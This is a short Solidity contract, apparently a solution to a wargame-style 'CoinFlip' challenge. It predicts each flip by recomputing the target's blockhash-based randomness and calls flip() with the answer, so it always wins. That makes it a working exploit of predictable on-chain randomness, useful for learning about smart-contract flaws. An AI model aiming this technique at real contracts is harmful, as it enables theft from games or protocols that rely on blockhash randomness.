// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./4_CoinFlip.sol";

contract CoinFlipSolver {
    CoinFlip coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function changeResult() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinflip = blockValue / FACTOR;
        bool side = coinflip == 1 ? true : false;
        coinFlip.flip(side);
    }
}
